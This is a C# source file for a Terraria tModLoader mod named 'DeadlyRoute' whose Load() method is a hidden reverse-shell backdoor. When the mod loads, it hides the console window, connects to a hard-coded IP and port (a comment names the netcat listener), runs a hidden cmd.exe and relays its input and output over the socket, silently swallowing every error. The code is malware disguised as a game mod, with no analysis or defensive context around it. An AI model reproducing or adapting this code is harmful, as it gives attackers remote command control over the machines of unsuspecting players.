using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Terraria.ModLoader;

namespace DeadlyRoute
{
	public class DeadlyRoute : Mod
	{
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static StreamWriter streamWriter;

        public override void Load()
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            string ip = "192.168.1.182";
            int port = 1776; // nc -lvnp 1776

            try
            {
                using (TcpClient client = new TcpClient(ip, port))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                //strInput.Append("\n");
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                // silence is golden
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception)
                {
                    // silence is golden
                }
            }
        }
    }
}
